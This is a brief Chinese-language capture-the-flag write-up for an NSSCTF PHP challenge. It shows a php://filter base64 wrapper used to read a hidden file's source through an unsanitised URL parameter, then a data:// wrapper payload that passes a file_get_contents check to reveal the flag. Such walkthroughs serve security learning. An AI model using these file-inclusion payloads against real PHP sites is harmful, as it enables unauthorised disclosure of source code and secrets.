頁面寫了`hint is hear Can you find out the hint.php?` -> 網址寫了`http://node1.anna.nssctf.cn:xxxxx/index.php?wllm=`

用php -> `php://filter/convert.base64-encode/resource=hint.php` ->
`PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=`
```php
<?php
//go to /test2222222222222.php
?>
```
去`http://node1.anna.nssctf.cn:xxxxx/test2222222222222.php`

```php
 <?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?> 
```

用data協議 -> `?a=data://a/plain,I want flag`

#和以前那題差不多
